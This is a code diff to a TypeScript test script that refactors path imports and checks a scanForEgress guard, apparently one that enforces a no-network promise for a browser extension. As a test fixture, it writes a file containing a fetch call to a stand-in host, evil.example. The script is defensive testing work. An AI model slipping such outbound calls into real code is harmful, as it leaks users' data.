@@ -12,15 +12,15 @@
  */
 import { mkdtempSync, mkdirSync, writeFileSync, rmSync } from 'node:fs';
 import { tmpdir } from 'node:os';
-import { resolve, dirname } from 'node:path';
+import nodePath from 'node:path';
 import { fileURLToPath, pathToFileURL } from 'node:url';
 import { collectPromises, scanForEgress } from './promises.mts';
 
-const repoRoot = resolve(dirname(fileURLToPath(import.meta.url)), '..', '..');
+const repoRoot = nodePath.resolve(nodePath.dirname(fileURLToPath(import.meta.url)), '..', '..');
 
 // Load the marketing strings via tsx's loader (the live values).
 const marketing = (await import(
-  pathToFileURL(resolve(repoRoot, 'apps/marketing/src/i18n.ts')).href
+  pathToFileURL(nodePath.resolve(repoRoot, 'apps/marketing/src/i18n.ts')).href
 )) as {
   strings?: Record<string, { transparency?: { heading?: string; caveat?: string } }>;
 };
@@ -51,12 +51,12 @@ if (liveEgress.length === 0) ok('scanForEgress finds no egress in the live exten
 else bad(`scanForEgress unexpectedly flagged: ${liveEgress.join(', ')}`);
 
 // 3. A planted egress call IS reported (the broken-invariant case).
-const fixture = mkdtempSync(resolve(tmpdir(), 'movar-promises-'));
+const fixture = mkdtempSync(nodePath.resolve(tmpdir(), 'movar-promises-'));
 try {
-  const srcDir = resolve(fixture, 'apps', 'extension', 'src');
+  const srcDir = nodePath.resolve(fixture, 'apps', 'extension', 'src');
   mkdirSync(srcDir, { recursive: true });
   writeFileSync(
-    resolve(srcDir, 'leak.ts'),
+    nodePath.resolve(srcDir, 'leak.ts'),
     'export const x = await fetch("https://evil.example");\n',
   );
   const hits = scanForEgress(fixture);
@@ -66,7 +66,7 @@ try {
     bad(`scanForEgress missed the planted egress call (got ${JSON.stringify(hits)})`);
   }
   // …and skips test files, so the guard never trips on its own fixtures.
-  writeFileSync(resolve(srcDir, 'leak.test.ts'), 'const y = fetch("https://x");\n');
+  writeFileSync(nodePath.resolve(srcDir, 'leak.test.ts'), 'const y = fetch("https://x");\n');
   const afterTest = scanForEgress(fixture);
   if (afterTest.length === 1) ok('scanForEgress ignores *.test.ts files');
   else bad(`scanForEgress should ignore the test file (got ${JSON.stringify(afterTest)})`);
